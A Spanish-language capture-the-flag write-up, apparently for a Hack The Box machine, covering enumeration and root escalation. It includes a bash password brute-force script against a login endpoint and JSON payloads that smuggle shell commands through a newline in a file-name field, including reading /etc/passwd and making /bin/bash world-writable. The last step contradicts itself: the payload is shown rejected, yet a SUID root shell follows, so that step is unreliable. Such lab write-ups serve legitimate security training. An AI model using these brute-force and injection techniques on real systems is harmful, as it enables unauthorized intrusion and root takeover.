### Local enumeration

Empezamos por enumerar los usuarios del sistema que manejen una bash
```bash
shawking@bigbang:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Hubble:/home/george:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
```

Parece que tenemos dos usuarios mas escalables en el sistema; george y developer. Guardaremos la infor para mas adelante.


Sudo -l :
not my luckiest day...
```bash
shawking@bigbang:~$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
```

Cron:
```bash
shawking@bigbang:~$ crontab -e
no crontab for shawking - using an empty one
```

Netstat
```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42669         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -       
```
Puede que tengamos algo jugosillo en ese puerto 9090

Intento hacer pivoting para ver que hay en ese puerto 9090 
pero nada;
![[Pasted image 20250204001637.png]]
```bash
shawking@bigbang:~$ nc -nz 127.0.0.1 9090
shawking@bigbang:~$ echo $?
0

```
Parece que el puerto funciona;

Probamos el puerto con un tunel ssh:
```bash
ssh shawking@bigbang.htb -L 9090:127.0.0.1:9090
```

Escaneando con FeroxBuster encontramos un /login y un /command en la pagina web
```bash
405      GET        5l       20w      153c http://127.0.0.1:9090/login
405      GET        5l       20w      153c http://127.0.0.1:9090/command

```
![[Pasted image 20250204110951.png]]

Nos da un 405
![[Pasted image 20250204111114.png]]





# Servidor Web 127.0.0.1:9090
Segun nuestro analisis previo el endpoint en el :9090 es un servidor web
```bash
sudo nmap -sCV -Pn -n -p 9090 127.0.0.1 --script http-methods      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 11:46 CET
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.83% done; ETC: 11:46 (0:00:00 remaining)
Nmap scan report for 127.0.0.1
Host is up (0.000069s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.10.12)
|_http-server-header: Werkzeug/3.0.3 Python/3.10.12

```

Fuzz:
del fuzz sacamos los siguientes endpoints
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9090/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 404ms]
command                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 177ms]
```

Endpoints: 
http://127.0.0.1:9090/login 
http://127.0.0.1:9090/command
### Fuerza bruta al :9090/login
Vamos a hacer bruteforce para intentar entrar como el usuario "developer" en http://127.0.0.1:9090/login

```bash
#!/bin/bash


URL="http://127.0.0.1:9090/login"

PASSWORD_FILE="/usr/share/wordlists/rockyou.txt"


USERNAME="developer"


while IFS= read -r PASSWORD; do
  echo "Probando pass: $PASSWORD"

  RESPONSE=$(curl -X POST -s -o /dev/null -w "%{http_code}" "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USERNAME\",\"password\":\"$PASSWORD\"}")

  
  if [ "$RESPONSE" != "405" ]  && [ "$RESPONSE" != "401" ]; then
    echo "¡Contraseña encontrada! -> $PASSWORD"
    echo "respuesta: $RESPONSE"
    break
  fi
done < $PASSWORD_FILE

```

bingo bingo bingo
```bash
¡Contraseña encontrada! -> bigbang
respuesta: 200
```

#### Usuario developer
Podemos loguearnos al usuario developer con la misma password; en ella encontramos un archivo .apk en al siguiente ruta :
`/home/developer/android/satellite-app.apk`


## 127.0.0.1:9090/login
```bash
➜  9090 curl -X POST -v 127.0.0.1:9090/login \    
-H "Content-Type: application/json" \
-d '{"username":"developer","password":"bigbang"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:9090...
* Connected to 127.0.0.1 (127.0.0.1) port 9090
* using HTTP/1.x
> POST /login HTTP/1.1
> Host: 127.0.0.1:9090
> User-Agent: curl/8.11.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 45
> 
* upload completely sent off: 45 bytes
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.10.12
< Date: Tue, 04 Feb 2025 10:28:53 GMT
< Content-Type: application/json
< Content-Length: 356
< Connection: close
< 
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODY2NDkzMywianRpIjoiZmM5OGUzYzMtMTJlNy00MjYwLWFlZmEtZGMzZjlhMThhNGMwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODY2NDkzMywiY3NyZiI6IjIyNjBlMzBhLWNkY2YtNDYzZS1iZmZiLTUwYjNjNWEwZTIzNiIsImV4cCI6MTczODY2ODUzM30.oNh4nYggI9d8ue_IrB3yaV9luehyMiMYeQW3dgEOcm8"}
* shutting down connection #0

```

## 127.0.0.1:9090/command
Get no esta permitido pues probamos nuestra vieja confiable POST
![[Pasted image 20250205114416.png]]

Permite POST:
```bash
shawking@bigbang:/home/shawking$ curl -X POST http://localhost:9090/command
{"msg":"Missing Authorization Header"}
```

Para el authorization Header vamos a probar con el access_token que nos proporciono la pagina web en el /login

```text
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczODc1NDkzMSwianRpIjoiMzU5MGRjODMtNjNjMC00OTgxLWI2NDQtZjQyODFhOWE1MjdmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczODc1NDkzMSwiY3NyZiI6IjU1YmYyYjRkLTlkNTMtNGZlNS1hMDBkLWI5ZjJlYjRkYjhmOSIsImV4cCI6MTczODc1ODUzMX0.-FKF_--KXab_qc0LqvhSow5fIviN5YBPO6tS1QoW3wE"
```

El endpoint acepta JSON data en este formato:
```json
`{     
"command": "send_image",
"output_file": "works.jpg"
}`
```

![[Pasted image 20250205123032.png]]

la variable `output_file` puede estar mal sanitizada  y llevarnos a rce vamos a probar

# Root access
```json
{
    "command": "send_image",
    "output_file": "test.png&whoami"
}
```
Response:
```json
{"error":"Output file path contains dangerous characters"}
```

Con \n:
```json
{
    "command": "send_image",
    "output_file": "test.png\nwhoami"
}
```
Response:
```bash
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nwhoami'"}
```

Vemos que busca un directorio, vamos a probar a leer archivos;
```json
{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../etc/passwd"

}
```

```json
{"error":"Error generating image: /bin/sh: 2: ../../../../../etc/passwd: Permission denied\n"}
```

Podemos cambiar los permisos del bash
```json
{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../usr/bin/chmod 777 /bin/bash"

}
```
```json
{"error":"Output file path contains dangerous characters"}

```
Sin embargo desde shawking:
```bash
shawking@bigbang:/var$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
```
---



